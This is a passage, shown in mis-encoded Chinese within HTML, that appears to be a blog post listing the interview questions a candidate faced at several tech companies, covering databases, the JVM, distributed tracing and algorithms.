ç¨‹åºåˆ†æç³»ç»Ÿ<ul><li>æœ‰å“ªäº›ååºåˆ—åŒ–æ¼æ´</li><li>æ¼æ´æ£€æµ‹æµç¨‹</li></ul></li><li>NoSQL å’Œ SQL çš„åŒºåˆ«<ul><li>æ˜¯å¦äº†è§£ DDB</li><li>Redshift çš„åº•å±‚å®ç°</li></ul></li><li>äºšé©¬é€Šå…¨æ ˆé¡¹ç›®ä»‹ç»</li><li>æœ‰å…³æ³¨ä»€ä¹ˆé¢†åŸŸ<ul><li>ä»€ä¹ˆæ˜¯äº‘åŸç”Ÿ</li><li>æœ‰å“ªäº›å†…å®¹ï¼ˆæœåŠ¡å™¨ã€ç½‘ç»œã€å­˜å‚¨ã€èº«ä»½è®¤è¯ã€ç­‰ç­‰ï¼‰</li></ul></li><li>æ›´æƒ³åšåå‘ä¸šåŠ¡çš„è¿˜æ˜¯åŸºç¡€æ¶æ„<ul><li>åŸºç¡€æ¶æ„ï¼Œä¹‹å‰åœ¨äºšé©¬é€Šå°±æ˜¯éå¸¸è´´è¿‘ä¸šåŠ¡ï¼Œç›´æ¥å’Œå–å®¶äº¤æµäº†éƒ½</li></ul></li><li>åé—®<ul><li>æ–°äººè¿›å»ä¼šæ¥è§¦ä»€ä¹ˆ</li><li>æ™‹å‡æœºåˆ¶</li></ul></li></ol><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>MySQL<ul><li>å¼•æ“</li><li>ç´¢å¼•</li><li>æŸ¥è¯¢ä¼˜åŒ–</li></ul></li><li>Redis<ul><li>æ•°æ®ç±»å‹ï¼Œåº”ç”¨åœºæ™¯</li></ul></li><li>æ¶ˆæ¯é˜Ÿåˆ—<ul><li>RabbitMQ</li><li>è¿˜æœ‰å“ªäº› MQï¼šKafkaã€RocketMQã€ZeroMQ</li></ul></li><li>TCP&#x2F;IPï¼šä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹</li><li>æœ€æœ‰æˆå°±æ„Ÿçš„é¡¹ç›®åŠå…¶å†…å®¹ï¼ŒæŠ€æœ¯æ ˆ</li><li>ç®—æ³•ï¼šèµ°æ¥¼æ¢¯ï¼ˆ3 ç§èµ°æ³•ï¼‰ï¼ŒåŠ¨æ€è§„åˆ’</li><li>åé—®<ul><li>ä»€ä¹ˆæ—¶å€™å‡ºç»“æœ</li><li>æœ‰å‡ è½®é¢è¯•ï¼š3 è½®</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>æœ€æœ‰æŒ‘æˆ˜çš„é¡¹ç›®<ul><li>å…¨æ ˆé¡¹ç›®ï¼Œæ•°æ®å¤„ç†ï¼ŒLambda ä¼˜åŒ–</li></ul></li><li>è¿˜æœ‰ä»€ä¹ˆéš¾ç‚¹å¯ä»¥ä»‹ç»<ul><li>é“¾è·¯è¿½è¸ªæ’æ¡©</li></ul></li><li>é¡¹ç›®ç›¸å…³é—®é¢˜<ul><li>æ•°æ®å­˜å‚¨åœ¨ä»€ä¹ˆæ•°æ®åº“</li><li>Lambda æ‰§è¡Œè€—æ—¶</li><li>å¦‚ä½•ä¼ é€’è¿½è¸ªæ•°æ®ï¼štraceId</li><li>æ¯æ¬¡è°ƒç”¨éƒ½è¦ç”Ÿæˆä»€ä¹ˆè¿½è¸ªä¿¡æ¯ï¼ˆä¼˜åŒ–ï¼‰<ul><li>ä¸€æ¡ trace ä¸­åªç”Ÿæˆ span ä¿¡æ¯ï¼Œä¸ç”¨å†ç”Ÿæˆ traceId</li></ul></li><li>å¦‚ä½•è®¾è®¡æ•°æ®çš„å­˜å‚¨ï¼ŒæŸ¥è¯¢æ—¶é—´èŒƒå›´å†…è°ƒç”¨äº†è¯¥ç»„ä»¶çš„ trace<ul><li>åˆ† trace å’Œ span å­˜å‚¨</li></ul></li></ul></li><li>Java çº¿ç¨‹çŠ¶æ€ï¼šä¸äº†è§£ï¼Œç„¶åä¸é—® Java äº†</li><li>å¦‚ä½•å­¦ä¹ æ–°æŠ€æœ¯</li><li>è¯»è¿‡å“ªäº›è®¾è®¡</li><li>æœªæ¥ 3-5 å¹´çš„è§„åˆ’</li><li>åé—®<ul><li>ä¸šåŠ¡ç”¨çš„æ¡†æ¶</li></ul></li></ol><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»ï¼Œå¦‚æœæ²¡æœ‰å·¥å…·å¦‚ä½•è‡ªå·±å®ç°</li><li>ç®—æ³•ï¼šLC41</li><li>ç³»ç»Ÿè®¾è®¡ï¼šåœè½¦åœº</li><li>åé—®ï¼šä¸šåŠ¡<ul><li>ä¼˜é€‰ï¼ˆä¸šåŠ¡ï¼‰</li><li>å¤§æ•°æ®éƒ¨é—¨ï¼ˆå·¥ç¨‹ï¼‰</li><li>æŠ€æœ¯æ ˆï¼šJavaã€Pythonã€å¯è§†åŒ–</li></ul></li></ol><h2 id="ç§‘å¤§è®¯é£"><a href="#ç§‘å¤§è®¯é£" class="headerlink" title="ç§‘å¤§è®¯é£"></a>ç§‘å¤§è®¯é£</h2><p>10 æœˆæ¥äº†æ„å‘ï¼Œ12 æœˆæ‰“ç”µè¯é—®æˆ‘æ˜¯å¦æœ‰äººå¯¹æ¥ï¼Œå·²æ‹’ğŸ˜…</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®æ€»ç»“ï¼šæç‚¼ã€æ€»ç»“</li><li>JVM<ul><li>å†…å­˜åŒºåŸŸ</li><li>åƒåœ¾æ”¶é›†å™¨</li><li>åƒåœ¾å›æ”¶</li><li>æ€§èƒ½è°ƒä¼˜ï¼ˆJVM å‚æ•°ï¼‰</li></ul></li><li>ThreadLocal å†…å­˜æ³„æ¼</li><li>Spring MVC<ul><li>å¯åŠ¨æµç¨‹</li><li>å†…ç½®è¿‡æ»¤å™¨æœ‰å“ªäº›ï¼Œæ€ä¹ˆå†™è¿‡æ»¤å™¨</li></ul></li><li>è®¡ç®—æœºç½‘ç»œ<ul><li>åŸŸååŠ«æŒ</li><li>DNS æŸ¥è¯¢è¿‡ç¨‹</li><li>ä¸­é—´äººæ”»å‡»åŠè§£å†³æ–¹æ³•</li></ul></li><li>åšç®—æ³•é¢˜çš„æ”¶è·<ul><li>å“ªäº›ä¸œè¥¿è®©ä½ è±ç„¶å¼€æœ—</li><li>æ•°æ®ç»“æ„&#x2F;ç®—æ³•çš„å…·ä½“åº”ç”¨åœºæ™¯</li></ul></li><li>é¡¹ç›®ä¸­æœ‰æˆå°±æ„Ÿçš„äº‹</li><li>Redis<ul><li>å“¨å…µæœºåˆ¶</li><li>åŠ å¿«ç¼“å­˜ï¼ˆè®¿é—® key çš„é€Ÿåº¦ï¼‰</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>æœ‰æ²¡æœ‰äº†è§£å…¶ä»–é“¾è·¯è¿½è¸ªå·¥å…·ï¼ˆSkywalkingï¼‰</li><li>æœ€æœ‰æŒ‘æˆ˜çš„é¡¹ç›®</li><li>æœ€æœ‰æˆå°±æ„Ÿçš„ç»å†</li><li>å¦‚ä½•è§£å†³åˆ†æ­§</li><li>æ„å‘åŸå¸‚</li><li>æœŸæœ›è–ªèµ„</li><li>èŒä¸šè§„åˆ’</li><li>åé—®<ul><li>æ–°äººåŸ¹è®­<ul><li>7 æœˆä¸­æ—¬å…¥èŒï¼Œä¸€ä¸ªæœˆåŸ¹è®­ï¼ˆæ€ç»´è½¬å˜ã€æŠ€æœ¯åŸ¹è®­ï¼‰</li><li>æ•™è‚²éƒ¨é—¨ 10 æœˆä¸­æ—¬ä¼šåˆ°ä¸€çº¿é«˜æ ¡éƒ¨ç½²ï¼Œè·å¾—äº§å“åé¦ˆ<ul><li>æŠ€æœ¯åˆ†äº«ï¼šBGã€è®­ç»ƒè¥</li></ul></li></ul></li><li>ç¼–ç¨‹è¯­è¨€å’Œæ¡†æ¶<ul><li>å¤§å‰ç«¯ï¼šIOSã€Androidã€HTML5</li><li>æœåŠ¡ç«¯ï¼šJavaï¼ˆå·¥ç¨‹ï¼‰ã€Golangï¼ˆä¸­é—´ä»¶ï¼‰ã€C++ï¼ˆAI å¼•æ“ï¼‰<ul><li>æ¡†æ¶ï¼šSpringBoot</li><li>RPCï¼šåŸºäº Dubbo æ‰©å±•</li><li>ç½‘å…³ï¼šè‡ªç ”</li><li>è¿½è¸ªï¼šå¼•å…¥ Skywalkingã€æ¥ ELK</li><li>ç†”æ–­ç­‰ï¼Œæ³¨å†Œä¸­å¿ƒ Zookeeper</li><li>æ¶ˆæ¯é˜Ÿåˆ—ï¼šRocketMQï¼ˆä¸šåŠ¡ï¼‰ã€Kafkaï¼ˆæ—¥å¿—ï¼‰</li><li>æ•°æ®åº“ï¼šMySQLã€MongoDBã€ElasticSearch</li></ul></li></ul></li><li>æ•™è‚²éƒ¨é—¨ï¼Œ14 ä¸ªç»„ï¼ŒæŒ‰éœ€æ±‚-æ„æ„¿-ç”»åƒåˆ†é…</li></ul></li></ol><p><strong>HR é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®ä¸­æœ€æœ‰æˆå°±æ„Ÿçš„äº‹æƒ…</li><li>é¡¹ç›®ä¸­é‡åˆ°çš„å›°éš¾</li><li>åˆä½œä¸åˆ†å·¥</li><li>é—®é¢˜<ul><li>ä¸šåŠ¡ï¼šæ•™è‚²bgï¼Œå…¥èŒåˆ†é…</li><li>å·¥ä½œåœ°ç‚¹ï¼šåˆè‚¥æœ¬éƒ¨ï¼Œæ­¦æ±‰ç ”å‘ä¸­å¿ƒï¼Œè¥¿å®‰ç ”å‘ä¸­å¿ƒ</li></ul></li></ol><h2 id="å¾®è½¯"><a href="#å¾®è½¯" class="headerlink" title="å¾®è½¯"></a>å¾®è½¯</h2><p>10.1 å’Œå¤§å®¶ä¸€èµ·æŒ‚äº†ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ç®—æ³•ï¼šè§£æ JSON å­—ç¬¦ä¸²</li><li>å¦‚ä½•å®ç° Lambda ä¼˜åŒ–</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿä»‹ç»</li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é‡ç‚¹é¡¹ç›®ä»‹ç»ï¼ˆé“¾è·¯è¿½è¸ªï¼‰<ul><li>å¦‚ä½•ä¼ é€’è¿½è¸ªä¿¡æ¯</li><li>è°æ¥ç”Ÿæˆ idï¼Œä»€ä¹ˆç®—æ³•</li><li>å¦‚ä½•æ³¨å…¥ RPC è°ƒç”¨</li></ul></li><li>ç®—æ³•ï¼šå®ç° <code>hasNext</code>ï¼ˆå¹‚ç­‰ï¼‰ã€<code>next</code> å‡½æ•°</li></ol><h2 id="äºšé©¬é€Š"><a href="#äºšé©¬é€Š" class="headerlink" title="äºšé©¬é€Š"></a>äºšé©¬é€Š</h2><p>ä¸¤è¿é¢ï¼Œæ— åç»­æ¶ˆæ¯ï¼Œé»˜è®¤æŒ‚äº†ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>äºšé©¬é€Šå…¨æ ˆé¡¹ç›®ä»‹ç»<ul><li>èƒŒæ™¯</li><li>å®ç°</li><li>ä¼˜åŒ–</li></ul></li><li>è½¬æ­£å¤±è´¥çš„åŸå›  </li><li>ç®—æ³•ï¼šè¾“å…¥ 2 ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œæ ¹æ® IP åˆ†ç»„ç»Ÿè®¡äº‹åŠ¡çš„å¹³å‡è€—æ—¶</li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‹±æ–‡<ul><li>è‡ªæˆ‘ä»‹ç»</li><li>ç®—æ³•é¢˜ç”¨çš„è¯­è¨€ï¼šC++ï¼Œåœ¨ä¸åŒçš„é¡¹ç›®ä¸­ä½¿ç”¨ä¸åŒçš„è¯­è¨€</li></ul></li><li>äºšé©¬é€Šå…¨æ ˆé¡¹ç›®ä»‹ç»ï¼ˆé€‰å‹ï¼‰</li><li>BQ é—®é¢˜<ul><li>å¼€å‘è¿‡ä»€ä¹ˆè‡ªåŠ¨åŒ–å·¥å…·ï¼Œå¸®åŠ©å›¢é˜Ÿæé«˜æ•ˆç‡</li><li>å›¢é˜Ÿé‡åˆ°åˆ†æ­§å¦‚ä½•è§£å†³ï¼ˆå¦‚ä½•åˆ†å·¥ï¼‰</li></ul></li><li>ç®—æ³•ï¼šè¾“å…¥ 2 ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œæ ¹æ® IP åˆ†ç»„ç»Ÿè®¡äº‹åŠ¡çš„å¹³å‡è€—æ—¶</li><li>åé—®ï¼šéƒ¨é—¨ç»„ç»‡<ul><li>AWS service (AWS-CP-Platform)</li><li>Global Team</li><li>Last Mile Engine</li></ul></li></ol><h2 id="èš‚èš"><a href="#èš‚èš" class="headerlink" title="èš‚èš"></a>èš‚èš</h2><p>é¢è¯•å®˜ä¼¼ä¹åœ¨èš‚èšå‘†äº†äº”å…­å¹´ï¼Œåš Service Mesh ç›¸å…³å†…å®¹ã€‚æˆ‘ä¸ªäººæ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œä½†æ˜¯å½“æ—¶è¿˜æ²¡æ€ä¹ˆå‡†å¤‡ JavağŸ˜¢</p><p><strong>ç”µè¯é¢</strong></p><ol><li>é¢è¯•å®˜ä»‹ç»ï¼šå¯ä¿¡å›¢é˜ŸæŠ€æœ¯éƒ¨-åŸºç¡€è®¾æ–½<ul><li>PaaS</li><li>K8sã€å®‰å…¨å®¹å™¨</li><li>å­˜å‚¨</li><li>ä¸­é—´ä»¶ï¼šç ”å‘æ¡†æ¶ï¼Œåˆ†å¸ƒå¼åº”ç”¨ç ”å‘ã€äº¤äº’</li></ul></li><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»</li><li>å¦‚ä½•å­¦ä¹ æ–°æŠ€æœ¯</li><li>æœ€è¿‘åœ¨è¯»çš„å†…å®¹</li><li>Java<ul><li>å¦‚ä½•å®ç°å¤šçº¿ç¨‹å¹¶å‘</li><li>åƒåœ¾å›æ”¶æœºåˆ¶</li></ul></li><li>åé—®<ul><li>æŠ€æœ¯æ ˆã€æ¡†æ¶</li><li>æ–°äººåŸ¹è®­æœºåˆ¶</li></ul></li></ol><h2 id="æ‹¼å¤šå¤š"><a href="#æ‹¼å¤šå¤š" class="headerlink" title="æ‹¼å¤šå¤š"></a>æ‹¼å¤šå¤š</h2><p>ç§‹æ‹›æŠ€æœ¯å²—åªæœ‰å†…æ¨ï¼Œéº»çƒ¦æ ¡å‹æ¨èäº†ï¼Œè™½ç„¶é’±ç»™å¾—å¤šä½† 996 å®åœ¨åŠé€€ã€‚é¢è¯•å®˜é—®æˆ‘æ˜¯å¦çœŸçš„æƒ³åšå·¥ç¨‹ï¼ŒåŒæ—¶è¡¨ç¤ºåšå·¥ç¨‹çš„å¥³ç”Ÿå°‘ğŸ˜“</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>çº¿ç¨‹ä¹‹é—´å…±äº«ä»€ä¹ˆèµ„æº</li><li>Java çš„åƒåœ¾å›æ”¶ç®—æ³•ã€åƒåœ¾æ”¶é›†å™¨</li><li>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç”¨é€”ã€æ–¹å¼</li><li>æ˜¯å¦äº†è§£ ProtoBuf</li><li>gRPCã€Thriftã€Dubbo</li><li>åŸºäº Java è¯­è¨€è®¾è®¡åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®ï¼Œéœ€è¦è§£å†³å“ªäº›é—®é¢˜</li><li>RPC è°ƒç”¨çš„æµç¨‹</li><li>MySQL<ul><li>æŸ¥è¯¢è¯­å¥æ‰§è¡Œæµç¨‹</li><li>æŸ¥è¯¢ä½¿ç”¨å“ªä¸ªç´¢å¼•ï¼Œå›è¡¨</li><li>ä¸»é”®ç´¢å¼•çš„æ•°æ®ç»“æ„ï¼Œå­˜å‚¨çš„å†…å®¹</li></ul></li><li>åŒºå—é“¾éƒ½æœ‰å“ªäº›å†…å®¹</li><li>Linux åŠ è½½åˆ°å†…å­˜çš„å¸ƒå±€ï¼Œå†…å­˜åŒºåŸŸ</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿä»‹ç»<ul><li>ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–æ¼æ´</li></ul></li><li>ç®—æ³•ï¼šæœ€å¤§å­åºåˆ—å’Œï¼ˆåŒºé—´ç«¯ç‚¹ï¼‰</li><li>åé—®<ul><li>æ–°äººåŸ¹è®­æœºåˆ¶ï¼šæŠ€æœ¯ã€ä¼ä¸šæ–‡åŒ–ï¼Œç”±å¸ˆå‚…å¸¦</li><li>å¤§éƒ¨é—¨æ‹›äºº</li><li>æŠ€æœ¯æ ˆï¼šä¸šåŠ¡ï¼ˆJavaï¼‰ã€å¼•æ“ï¼ˆC++ï¼‰</li><li>å¤§å°å‘¨è¿˜æ˜¯å›ºå®šå…­å¤©ï¼š996</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>æ¯ä¸ªé¡¹ç›®çš„éš¾ç‚¹ä»‹ç»</li><li>è®¾è®¡ Redis&#x2F;HashMap æŒä¹…åŒ–ï¼ˆæ•°æ®ç»“æ„ï¼Œå¦‚ä½•å†™å…¥æ–‡ä»¶ï¼‰</li><li>HashMap åº•å±‚</li><li>è®¾è®¡ï¼šæ’å…¥&#x2F;åˆ é™¤&#x2F;éšæœºé€‰å–ï¼ŒO(1)</li><li>ç®—æ³•ï¼šäºŒå‰æ ‘çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</li><li>åé—®ï¼šå¤§ç»„æ‹›äºº</li></ol><h2 id="å¸¦åŠ¨çƒ­æ½®"><a href="#å¸¦åŠ¨çƒ­æ½®" class="headerlink" title="å¸¦åŠ¨çƒ­æ½®"></a>å¸¦åŠ¨çƒ­æ½®</h2><p>ç‰›å®¢ç½‘æŠ•é€’ï¼Œé¢è¯•æ¯”è¾ƒæ°´ï¼ŒHR æŒºæœ‰æ„æ€ï¼ˆè¤’ä¹‰ï¼‰ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é“¾è·¯è¿½è¸ªé¡¹ç›®ä»‹ç»<ul><li>ç½‘ç»œè™šæ‹ŸåŒ–ï¼ˆNeutronï¼‰</li><li>å¦‚ä½•ä¿è¯ traceID ä¸é‡å¤ï¼šUUID</li><li>å¦‚ä½•å®ç°å¤šè¿›ç¨‹è¿½è¸ª</li></ul></li><li>å¤§æ–‡ä»¶ topKï¼šæ’åºã€åˆ†ç‰‡ã€å°æ ¹å †</li><li>åé—®<ul><li>å·¥ä½œå†…å®¹ï¼šK8Sã€Java&#x2F;Pythonï¼Œå³æ—¶é€šä¿¡ï¼ˆå¹¶å‘ã€å¯ç”¨ï¼‰ï¼Œç®—æ³•ï¼ˆNLPã€å›¾åƒå¤„ç†ï¼‰</li><li>æ˜¯å¦æœ‰äººæŒ‡å¯¼ï¼šæ²¡æœ‰å¤§å‚çš„æ–°äººåŸ¹è®­æœºåˆ¶</li><li>å¤šä¹…å‡ºç»“æœ</li></ul></li></ol><h2 id="å¿«æ‰‹"><a href="#å¿«æ‰‹" class="headerlink" title="å¿«æ‰‹"></a>å¿«æ‰‹</h2><p>é¢è¯•ç¬‘å˜»å˜»ï¼Œåæ‰‹ç»™äººæŒ‚ğŸ™</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é“¾è·¯è¿½è¸ªç³»ç»Ÿä»‹ç»</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿä»‹ç»ã€è§£é‡Šååºåˆ—åŒ–æ¼æ´</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»ï¼šä¸šåŠ¡ã€å¤§æ•°æ®å¤„ç†</li><li>æ¢è®¨ï¼šæ—¥å¿—å‹ç¼©ï¼Œä¸ç”¨è§£å‹è·å¾—å¯¹åº”æ•°æ®</li><li>Java é”ï¼ˆä¸äº†è§£ï¼Œå¼€å§‹é—® JVMï¼‰</li><li>GC åƒåœ¾æ”¶é›†</li><li>HashMap åº•å±‚å®ç°</li><li>å“ˆå¸Œå†²çªè§£å†³æ–¹å¼</li><li>ä»å³å¾€å·¦å±‚åºéå†<ul><li>å‡è®¾æ¯å±‚æ˜¯æ»¡çš„ï¼Œæ²¡æœ‰åˆ™å¡«å……</li><li>æ–¹æ³•ä¸€ï¼šæ”¾å…¥ null èŠ‚ç‚¹</li><li>æ–¹æ³•äºŒï¼šæ ¹æ®ä¸Šä¸€å±‚èŠ‚ç‚¹è¿›è¡Œå¡«å……</li></ul></li><li>åé—®<ul><li>éƒ¨é—¨æ‹›äººï¼Œè¿›å»å†åˆ†é…</li><li>æ–°äººåŸ¹å…»æœºåˆ¶</li><li>ä¸»è¦çš„è¯­è¨€å’ŒæŠ€æœ¯æ ˆ</li></ul></li></ol><h2 id="ææ™ºå˜‰"><a href="#ææ™ºå˜‰" class="headerlink" title="ææ™ºå˜‰"></a>ææ™ºå˜‰</h2><p>å¯¹æ¥çš„ HR å®ä¹ ç”Ÿè·‘è·¯ï¼ŒäºŒé¢çš„é¢è¯•å®˜è¿Ÿåˆ° 15 minï¼Œæ€åº¦æå…¶æ•·è¡ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é“¾è·¯è¿½è¸ªç³»ç»Ÿä»‹ç»</li><li>MySQL äº‹åŠ¡ã€ç´¢å¼•ã€æ•°æ®ç±»å‹</li><li><code>char</code> å’Œ <code>varchar</code> å¯¹æ¯”</li><li>Redis é€‚ç”¨åœºæ™¯ã€ä¼˜ç¼ºç‚¹</li><li>Java çº¿ç¨‹å®‰å…¨çš„å®ç°æ–¹å¼</li><li>JVM ä»€ä¹ˆæ—¶å€™è¿›è¡Œåƒåœ¾å›æ”¶ï¼Œå¦‚ä½•åˆ¤æ–­å¯¹è±¡æ˜¯å¦å­˜æ´»</li><li>Spring æ¡†æ¶ï¼ˆä¸äº†è§£ï¼‰</li><li>åé—®<ul><li>éƒ¨é—¨æ‹›äººæŒ‰ç»„åˆ†é…</li><li>ä¸€å…± 3 é¢ï¼Œä¸€å‘¨å†…å‡ºç»“æœ</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>OOP ä¸‰å¤§ç‰¹æ€§ï¼ŒJava å¦‚ä½•å®ç°å¤šæ€</li><li>Java ç›¸å…³<ul><li><code>private</code>ã€<code>protected</code></li><li><code>final</code> ä¿®é¥°ç±»</li><li>çº¿ç¨‹åŒæ­¥</li><li>ç½‘ç»œç¼–ç¨‹</li></ul></li><li>Linux å¸¸ç”¨å‘½ä»¤</li><li>æ•°æ®åº“ä¸‰å¤§èŒƒå¼</li><li>MySQL ç´¢å¼•ä½œç”¨</li><li>HTTP çŠ¶æ€ç ï¼š404ã€500</li></ol><h2 id="å­—èŠ‚è·³åŠ¨"><a href="#å­—èŠ‚è·³åŠ¨" class="headerlink" title="å­—èŠ‚è·³åŠ¨"></a>å­—èŠ‚è·³åŠ¨</h2><p>SQL æ²¡å†™å‡ºæ¥ä¸ä»£è¡¨å®Œå…¨æ²¡æ¥è§¦è¿‡ï¼Œä¸æ°å½“åœ°æ‰©å±•ä¸€ä¸‹ï¼Œä¸€æ—¶åŠä¼šå„¿å¿˜è®°æŸæ±‰å­—æ€ä¹ˆå†™å°±ä»£è¡¨ä¸ä¼šæ±‰è¯­ï¼Ÿå½“ç„¶æˆ‘æ²¡æ€ä¹ˆå¤ä¹  SQL ä¹Ÿæ˜¯äº‹å®ã€‚</p><p>å¦å¤–ï¼Œä¸šåŠ¡é¢æ‰€è°“çš„ã€ŒçŸ¥è¯†è¿ç§»ã€å®Œå…¨å°±æ˜¯ã€Œçªå‘å¥‡æƒ³ã€ï¼Œæˆ‘ä¸åšè¿™ä¸ªå†…å®¹ï¼Œä¸šåŠ¡ä¹Ÿä¸åšè¿™ä¸ªå†…å®¹ï¼ŒçœŸä¸çŸ¥é“æ˜¯æ€ä¹ˆæƒ³çš„ğŸ˜…</p><p>ä¸è¿‡ HR ç»™äººå°è±¡å¾ˆå¥½ï¼Œé€šçŸ¥å’Œåå•†éƒ½å¾ˆåŠæ—¶å‹å¥½ï¼Œæ¥åˆ° Unity å°±ä¸ç­‰è¿™è¾¹äº†ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>å…¨æ ˆé¡¹ç›®ä»‹ç»</li><li>ç®—æ³•ï¼šå²›å±¿æ•°é‡</li><li>è®¾è®¡ï¼šå­¦ç”Ÿã€è€å¸ˆã€é€‰è¯¾ï¼ŒER å…³ç³»</li><li>Cookie ä¸ Session</li><li>Nginx åå‘ä»£ç†ï¼Œæ­£å‘ä»£ç†ï¼Œå¦‚ä½•å®ç°é«˜å¹¶å‘</li><li>ä¹è§‚é”&#x2F;æ‚²è§‚é”&#x2F;è‡ªæ—‹é”ï¼ŒCASã€ABA é—®é¢˜</li><li>TCP æµé‡æ§åˆ¶</li><li>æ˜¯å¦äº†è§£ Golang çš„ Context</li><li>åé—®<ul><li>éƒ¨é—¨æ‹›äºº</li><li>æŠ€æœ¯æ ˆ</li><li>å‡ è½®é¢è¯•</li><li>é¢è¯•ç»“æœå¤šä¹…å‡º</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿä»‹ç»</li><li>è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«</li><li>è¿›ç¨‹é—´é€šä¿¡æ–¹å¼</li><li>HashMap ä¸ ConcurrentHashMap åŒºåˆ«ä¸åº•å±‚å®ç°</li><li>Spring ä¸äº†è§£ -&gt; AOP ä¸ä¾èµ–æ³¨å…¥çš„å…³ç³»</li><li>MySQL ç´¢å¼•</li><li>HTTP æµç¨‹</li><li>SQLï¼š<code>student</code>ã€<code>student_score</code> æ²¡æœ‰ä¸åŠæ ¼çš„å­¦ç”Ÿå§“åï¼Œæ€»æˆç»© top3 çš„å­¦ç”Ÿå§“å</li><li>ç®—æ³•ï¼šåˆå¹¶ k ä¸ªæœ‰åºé“¾è¡¨</li></ol><p><strong>ä¸‰é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»ï¼ˆåŒ…æ‹¬ä¼˜åŠ¿ï¼‰</li><li>å®ä¹ ç»å†æ‰“åˆ†ï¼ˆ8&#x2F;10ï¼‰ï¼Œä¸ºä»€ä¹ˆ</li><li>æŠ€æœ¯æ²‰æ·€ï¼šè·Ÿé¡¹ç›®èµ°</li><li>ä»‹ç»é“¾è·¯è¿½è¸ªå·¥å…· Jaeger <ul><li>å¦‚ä½•æŒ–æ˜æ¼æ´</li><li>OpenTelemetry è§„èŒƒï¼Œä¸ºä»€ä¹ˆè¦ç»Ÿä¸€è§„èŒƒ</li><li>Jaeger å®ç°ï¼ˆåŠŸèƒ½ã€æ¨¡å—ï¼‰</li></ul></li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»ï¼šåšå¾—æœ€æœ‰éš¾åº¦çš„ç‚¹ï¼ˆLambda ä¼˜åŒ–ï¼‰</li><li>MySQL è”åˆç´¢å¼•è®¾è®¡ï¼Œéœ€è¦è€ƒè™‘ä»€ä¹ˆ</li><li>JVM å†…å­˜åŒºåŸŸï¼Œåˆ’åˆ†æ–¹å¼ï¼ˆæ–°ç”Ÿä»£ã€è€å¹´ä»£ï¼‰ã€åƒåœ¾æ”¶é›†ä¸ºä»€ä¹ˆè¦æš‚åœçº¿ç¨‹</li><li>ç®—æ³•ï¼šLC540</li><li>å‘å±•æ–¹å‘ï¼šä¸šåŠ¡&#x2F;åŸºæ¶ï¼Œä¸ºä»€ä¹ˆ</li><li>æè¿°è‡ªå·±çš„ä¼˜ç¼ºç‚¹</li><li>åé—®ï¼š<ul><li>ä¸šåŠ¡ä»‹ç»ï¼šå†…éƒ¨åˆ†ä¸ºå¾ˆå¤šé¡¹ç›®ç»„ï¼ŒåŒ—äº¬&#x2F;ä¸Šæµ·</li><li>å‘å±•å‰æ™¯ï¼šæŠ–éŸ³ç”µå•†ï¼ˆ2å¹´ï¼‰ï¼Œå®Œæˆæ·˜å®ï¼ˆ20å¹´ï¼‰çš„ 10+ å¹´</li></ul></li></ol><p><strong>å››é¢ï¼ˆä¸šåŠ¡ï¼‰</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»<ul><li>å¦‚ä½•è¯„ä»·é¡¹ç›®çš„è¡¨ç°æƒ…å†µ</li><li>é¡¹ç›®å®Œæˆåæœ‰ä»€ä¹ˆå¸®åŠ©&#x2F;æ”¹å˜</li><li>å®ä¹ æ”¶è·ï¼šé”»ç‚¼å¿«é€Ÿå­¦ä¹ èƒ½åŠ›ã€è®¾è®¡æ–‡æ¡£æ’°å†™ã€UI 